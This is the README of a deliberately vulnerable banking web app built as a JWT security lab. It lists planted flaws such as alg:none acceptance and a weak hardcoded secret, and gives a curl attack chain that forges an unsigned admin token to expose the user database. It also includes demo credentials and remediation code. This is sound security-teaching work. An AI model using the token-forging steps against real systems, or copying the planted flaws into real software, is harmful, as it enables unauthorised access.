<div align="center">

# 🏦 KIIS Bank Portal
### Full-Stack Cybersecurity Research & JWT Vulnerability Lab

[![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15-336791?style=for-the-badge&logo=postgresql&logoColor=white)](https://postgresql.org)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)
[![JWT](https://img.shields.io/badge/JWT-HS256-000000?style=for-the-badge&logo=jsonwebtokens&logoColor=white)](https://jwt.io)

<br/>

> **A production-grade banking simulation platform built for hands-on cybersecurity research.**  
> Features intentional, real-world JWT vulnerabilities for penetration testing demonstrations using Burp Suite.

<br/>

**[📋 Security Report (PDF)](./KIIS_Bank_Cybersecurity_Report_Himamanth.pdf) · [🔬 Vulnerability Lab](#-vulnerability-lab) · [🚀 Quick Start](#-quick-start) · [🛡️ Findings](#️-security-findings-summary)**

</div>

---

## 📌 What Is This Project?

KIIS Bank Portal is a **fully functional, full-stack banking web application** designed as a cybersecurity education and penetration testing lab. It simulates a real digital banking environment complete with:

- 👤 Multi-role authentication (Customer → Employee → Manager → Admin)
- 💳 Account management, fund transfers, and fixed deposits
- 🪪 Virtual KYC (vKYC) document submission workflow
- 🔐 JWT-based authentication with **intentionally embedded CVE-class vulnerabilities**
- 🧪 A togglable Security Lab mode for live exploit demonstrations

> **This is not a toy project.** It implements ACID-compliant transactions, Docker orchestration, Nginx reverse proxy, PostgreSQL persistence, and a production-ready React frontend — with deliberate security flaws layered in to enable realistic penetration testing practice.

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────┐
│                     Nginx (Reverse Proxy)            │
│                  TLS · Rate Limiting · CORS          │
└──────────────────┬──────────────────┬───────────────┘
                   │                  │
        ┌──────────▼──────┐  ┌────────▼────────┐
        │  React / Vite   │  │  FastAPI Backend │
        │  TailwindCSS    │  │  Uvicorn · JWT   │
        │  Three.js / R3F │  │  SQLAlchemy ORM  │
        └─────────────────┘  └────────┬────────┘
                                      │
                             ┌────────▼────────┐
                             │   PostgreSQL 15  │
                             │  Users · Accounts│
                             │  Transactions    │
                             └─────────────────┘
```

### Tech Stack

| Layer | Technology |
|-------|-----------|
| **Frontend** | React 18 · Vite 5 · TailwindCSS · Three.js / React Three Fiber |
| **Backend** | Python FastAPI · Uvicorn · python-jose · bcrypt |
| **Database** | PostgreSQL 15 · SQLAlchemy 2.0 ORM · SQLite (local dev) |
| **DevOps** | Docker · docker-compose · Nginx · Render.com (render.yaml) |
| **Security Tools** | Burp Suite · jwt.io · hashcat-compatible JWT lab |

---

## 🛡️ Security Findings Summary

> These vulnerabilities are **intentional** and designed for educational demonstration.  
> A full CVE-style report is available: [📋 KIIS_Bank_Cybersecurity_Report.pdf](./KIIS_Bank_Cybersecurity_Report_Himamanth.pdf)

| ID | Vulnerability | Severity | CVSS | CWE |
|----|--------------|----------|------|-----|
| VLN-01 | JWT Algorithm Confusion — `alg:none` Bypass | 🔴 **CRITICAL** | 9.8 | CWE-347 |
| VLN-02 | JWT Role Claim Privilege Escalation | 🔴 **CRITICAL** | 9.1 | CWE-266 |
| VLN-03 | Weak Signing Secret — Brute-Force Risk | 🟠 **HIGH** | 7.5 | CWE-522 |
| VLN-04 | Hardcoded Fallback Secret in Source Code | 🟠 **HIGH** | 7.2 | CWE-321 |
| VLN-05 | Overly Permissive CORS Configuration | 🔵 **INFO** | 4.3 | CWE-942 |
| VLN-06 | Role Embedded in JWT Payload (Design Flaw) | 🔵 **INFO** | 3.1 | CWE-284 |

### OWASP Top 10 (2025) Mapping

| Finding | OWASP 2025 Category | ID |
|---------|--------------------|----|
| JWT alg:none Bypass | Cryptographic Failures | **A04** |
| Role Privilege Escalation | Broken Access Control | **A01** |
| Weak Signing Secret | Security Misconfiguration | **A02** |
| Hardcoded Secret in Source | Security Misconfiguration | **A02** |
| Permissive CORS | Security Misconfiguration | **A02** |
| Role Embedded in JWT Payload | Authentication Failures | **A07** |

> 🆕 **OWASP 2025 key changes:** Security Misconfiguration moved up to **#2** · New categories added: **A03** Software Supply Chain Failures & **A10** Mishandling of Exceptional Conditions · Cryptographic Failures shifted to **#4** · "Identification and Authentication Failures" renamed to **Authentication Failures**

---

## 🔬 Vulnerability Lab

The lab is activated by setting `SECURITY_LAB_MODE=true`. When enabled, three special endpoints become available:

```
GET /api/lab/status                                      → Confirms lab is active
GET /api/lab/forge-token/none?username=Jane Doe&role=admin  → Returns unsigned alg:none JWT
GET /api/lab/forge-token/weak-secret?username=...&role=admin → Returns weak-key signed JWT
```

### Attack Chain: JWT Privilege Escalation (5 minutes)

```bash
# Step 1 — Login as a low-privilege customer, observe 403
curl -X POST /api/auth/login -d '{"username":"jane_doe","password":"customer123"}'
# → { "access_token": "eyJ...", "role": "customer" }

curl /api/admin/users -H "Authorization: Bearer <customer_token>"
# → 403 Forbidden ✓ (RBAC working normally)

# Step 2 — Forge an unsigned token with role=admin
curl /api/lab/forge-token/none?username=Jane%20Doe&role=admin
# → { "token": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJKYW5lIERvZSIsInJvbGUiOiJhZG1pbiJ9." }

# Step 3 — Use forged token → full privilege escalation
curl /api/admin/users -H "Authorization: Bearer <forged_token>"
# → 200 OK — complete user database exposed 🔓
```

### Burp Suite Integration

See [`BURP_SUITE.md`](./BURP_SUITE.md) for the complete Burp Proxy → Repeater workflow including:
- Intercepting login and extracting the JWT
- Sending to Repeater and modifying the `Authorization` header
- Forging tokens via the lab API and replaying requests

---

## 👥 Role Hierarchy & API Endpoints

| Role | Prefix | Capabilities |
|------|--------|-------------|
| `customer` | `/api/customer/` | Accounts, transfers, vKYC upload, fixed deposits |
| `employee` | `/api/employee/` | Customer lookup, transaction view |
| `manager` | `/api/manager/` | Reporting, account oversight |
| `admin` | `/api/admin/` | User management, account provisioning |

RBAC is enforced via a `RoleChecker` dependency injected into each FastAPI route:

```python
admin_clearance = auth.RoleChecker(["admin"])

@router.get("/users")
def list_users(current_user = Depends(admin_clearance)):
    ...
```

---

## 🚀 Quick Start

### Local (SQLite — no Docker needed)

```bash
git clone https://github.com/Himamanth997/kiis-bank-portal.git
cd kiis-bank-portal/backend

python -m venv venv && source venv/bin/activate   # Windows: venv\Scripts\activate
pip install -r requirements.txt

# Start API
uvicorn app.main:app --reload --port 8000
```

Open `http://localhost:8000` — the React frontend is served from the same origin.

### Docker Compose (Full Stack)

```bash
cp .env.example .env       # Set JWT_SECRET and DB credentials
docker compose up -d --build
docker compose exec backend python seed.py   # Seed demo users
```

### Enable Security Lab Mode

```bash
# Local
export SECURITY_LAB_MODE=true
uvicorn app.main:app --port 8000

# Docker / Render — add environment variable:
SECURITY_LAB_MODE=true
```

### Demo Credentials (after seeding)

| Username | Password | Role |
|----------|----------|------|
| `jane_doe` | `customer123` | Customer |
| `john_staff` | `employee123` | Employee |
| `admin` | `admin123` | Admin |

---

## 📁 Project Structure

```
kiis-bank-portal/
├── backend/
│   ├── app/
│   │   ├── main.py            # FastAPI app, CORS, routing
│   │   ├── auth.py            # JWT creation, validation, RoleChecker
│   │   ├── lab_jwt.py         # ⚠️ Intentional JWT bypass logic (lab only)
│   │   ├── models.py          # SQLAlchemy models (User, Account, Transaction...)
│   │   ├── schemas.py         # Pydantic request/response schemas
│   │   ├── config.py          # Settings & environment variables
│   │   └── routers/
│   │       ├── auth.py        # /api/auth/login, /register
│   │       ├── customer.py    # /api/customer/* (transfers, vKYC, FD)
│   │       ├── employee.py    # /api/employee/*
│   │       ├── manager.py     # /api/manager/*
│   │       ├── admin.py       # /api/admin/* (user management)
│   │       └── lab_security.py# /api/lab/* (forge endpoints — lab mode only)
│   ├── seed.py                # Database seeding script
│   └── requirements.txt
├── frontend/
│   └── src/
│       ├── components/        # React components (SecurityLabSection, Login modals...)
│       ├── context/AuthContext.jsx
│       └── lib/api.js         # API client
├── deploy/
│   ├── nginx.conf             # Nginx main config
│   └── nginx_frontend.conf    # Frontend serving config
├── docker-compose.yml
├── render.yaml                # Render.com deployment blueprint
├── BURP_SUITE.md              # Burp Suite exploitation guide
└── SECURITY_LAB_PRESENTATION.md  # 5-minute demo script
```

---

## 🔒 Security Design: What's Intentionally Vulnerable vs. Secure

| Component | Status | Notes |
|-----------|--------|-------|
| Password hashing (bcrypt) | ✅ Secure | Cost factor 12, proper salt generation |
| RBAC enforcement | ✅ Secure | RoleChecker on every protected route |
| ACID transactions | ✅ Secure | SELECT FOR UPDATE row locking on transfers |
| JWT algorithm whitelist | ❌ Vulnerable | `alg:none` accepted in lab mode — **by design** |
| Role from DB (not token) | ❌ Vulnerable | `trust_token_role=True` path exists — **by design** |
| Signing secret | ❌ Vulnerable | Weak fallback secret in config — **by design** |
| CORS policy | ⚠️ Permissive | Wildcard regex on shared platforms |

---

## 📋 Remediation Reference

For each vulnerability found, the full remediation is documented in the [security report](./KIIS_Bank_Cybersecurity_Report_Himamanth.pdf). Key fixes:

```python
# ✅ Fix 1 — Enforce algorithm whitelist
jwt.decode(token, SECRET_KEY, algorithms=["HS256"])  # Never "none"

# ✅ Fix 2 — Always resolve role from database
user = db.query(User).filter(User.username == sub).first()
role = user.role  # Never: payload.get("role")

# ✅ Fix 3 — Strong secret, never hardcoded
import secrets
SECRET_KEY = os.environ["SECRET_KEY"]  # Raise if missing; generate with secrets.token_hex(64)
```

---

## 📜 Disclaimer

> This project is built **exclusively for educational and cybersecurity research purposes**.  
> All vulnerabilities are intentional and are disabled in normal (non-lab) mode.  
> Do not deploy with `SECURITY_LAB_MODE=true` in any public or production environment.  
> The author bears no responsibility for misuse of the techniques demonstrated.

---

<div align="center">

**Built & researched by [Himamanth](https://github.com/Himamanth997)**  
*Cybersecurity Professional · Penetration Tester · AppSec Researcher*

⭐ Star this repo if you found it useful for security learning!

</div>
